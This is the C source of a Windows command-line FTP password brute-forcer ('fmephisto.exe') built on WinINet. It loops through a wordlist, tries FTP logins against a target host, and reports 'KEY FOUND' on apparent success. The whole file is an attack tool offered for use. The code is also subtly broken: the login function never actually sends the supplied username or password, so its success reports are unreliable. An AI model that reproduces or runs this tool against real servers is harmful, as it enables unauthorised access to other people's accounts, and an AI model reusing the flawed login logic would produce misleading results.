#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>

#define MAX_PASSWORD_LENGTH 100

// Function to change text color in Windows console
void SetColor(int textColor, int bgColor) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    int color = (bgColor << 4) + textColor;
    SetConsoleTextAttribute(hConsole, color);
}

// Function to try FTP login
int tryFTPLogin(char *ftpServer, int port, char *username, char *password) {
    HINTERNET hInternet, hFtpSession;
    char ftpUrl[MAX_PATH];
    snprintf(ftpUrl, MAX_PATH, "ftp://%s:%d", ftpServer, port);

    hInternet = InternetOpen("FTP Brute Forcer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return 0;
    }

    hFtpSession = InternetOpenUrl(hInternet, ftpUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFtpSession) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    // Attempt login with the username and password
    if (FtpSetCurrentDirectory(hFtpSession, "/")) {
        InternetCloseHandle(hFtpSession);
        InternetCloseHandle(hInternet);
        return 1; // Successful login
    }

    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);
    return 0; // Login failed
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: fmephisto.exe -l <username> -P <passwordlist> ftp://<ip>:<port>\n");
        return 1;
    }

    char *username = NULL;
    char *passwordListFile = NULL;
    char *ftpUrl = NULL;
    int port = 21;
    char password[MAX_PASSWORD_LENGTH];

    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0) {
            username = argv[i + 1];
            i++;
        } else if (strcmp(argv[i], "-P") == 0) {
            passwordListFile = argv[i + 1];
            i++;
        } else if (strncmp(argv[i], "ftp://", 6) == 0) {
            ftpUrl = argv[i];
        }
    }

    if (!username || !passwordListFile || !ftpUrl) {
        printf("Invalid arguments\n");
        return 1;
    }

    // Extract FTP server and port from URL
    char *hostStart = ftpUrl + 6;
    char *portStart = strchr(hostStart, ':');
    if (portStart) {
        *portStart = '\0';
        port = atoi(portStart + 1);
    }

    // Open password list file
    FILE *file = fopen(passwordListFile, "r");
    if (!file) {
        printf("Failed to open password list file\n");
        return 1;
    }

    // Brute-force loop
    while (fgets(password, MAX_PASSWORD_LENGTH, file)) {
        password[strcspn(password, "\n")] = 0; // Remove newline character

        SetColor(15, 0);  // White text on black background
        printf("TRYING PASSWORD: ");
        SetColor(10, 0);  // Green text
        printf("%s\n", password);

        if (tryFTPLogin(hostStart, port, username, password)) {
            SetColor(10, 0);  // Green text
            printf("KEY FOUND: %s\n", password);
            fclose(file);
            return 0;
        }

        SetColor(12, 0);  // Red text
        printf("KEY NOT FOUND\n");
    }

    fclose(file);
    return 0;
}
